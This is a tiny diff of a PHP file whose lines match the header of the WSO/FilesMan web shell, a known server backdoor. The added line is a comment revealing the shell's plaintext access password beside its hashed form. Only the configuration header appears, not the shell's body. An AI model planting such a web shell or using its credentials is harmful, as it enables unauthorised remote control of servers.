@@ -1,4 +1,5 @@
 <?php
+//password: stp5940
 $auth_pass = "5f4b30c6efa419426de33fe0b7785bdf";
 $color = "#df5";
 $default_action = 'FilesMan';
